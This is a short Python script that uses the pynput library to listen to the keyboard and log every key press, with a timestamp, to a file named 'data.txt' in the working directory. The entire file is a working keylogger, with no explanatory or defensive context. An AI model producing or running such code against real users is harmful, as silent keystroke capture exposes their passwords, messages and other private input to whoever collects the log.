from pynput.keyboard import Key, Listener
import logging
import os

filename = "data.txt"
current_path = os.getcwd()

FILE_PATH = os.path.join(current_path, filename)

logging.basicConfig(filename=FILE_PATH, \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
